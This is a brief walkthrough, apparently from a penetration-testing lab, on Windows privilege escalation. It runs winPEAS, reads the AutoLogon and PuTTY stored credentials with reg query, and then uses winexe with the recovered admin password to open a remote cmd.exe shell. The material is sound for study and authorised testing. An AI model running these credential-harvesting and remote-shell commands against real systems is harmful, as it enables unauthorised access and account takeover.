1.Use winPEAS to check common password locations:
> .\winPEASany.exe quiet filesinfo userinfo


(the final checks will take a long time to complete)


2.The results show both AutoLogon credentials and Putty session credentials for the admin user
(admin/password123).


3.We can verify these manually:

> reg query "HKLM\Software\Microsoft\Windows
NT\CurrentVersion\winlogon"


> reg query
"HKCU\Software\SimonTatham\PuTTY\Sessions" /s


4.On Kali, we can use the winexe command to spawn a shell using these
credentials:

winexe -U 'admin%password123' //192.168.1.22
cmd.exe
